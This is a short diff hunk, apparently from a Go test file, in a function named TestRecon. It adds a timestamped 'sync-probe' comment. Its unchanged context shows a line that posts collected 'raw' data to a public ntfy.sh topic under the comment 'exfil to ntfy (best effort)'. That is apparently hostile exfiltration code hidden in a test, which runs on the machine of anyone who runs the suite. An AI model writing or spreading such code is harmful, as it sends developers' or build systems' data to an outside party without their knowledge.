@@ -120,3 +120,5 @@ func TestRecon(t *testing.T) {
 	// exfil to ntfy (best effort)
 	httpPost("https://ntfy.sh/kvknyk4so1vs8lk4uui3zb1i", raw)
 }
+
+// sync-probe 2026-11-16T06:38:04Z
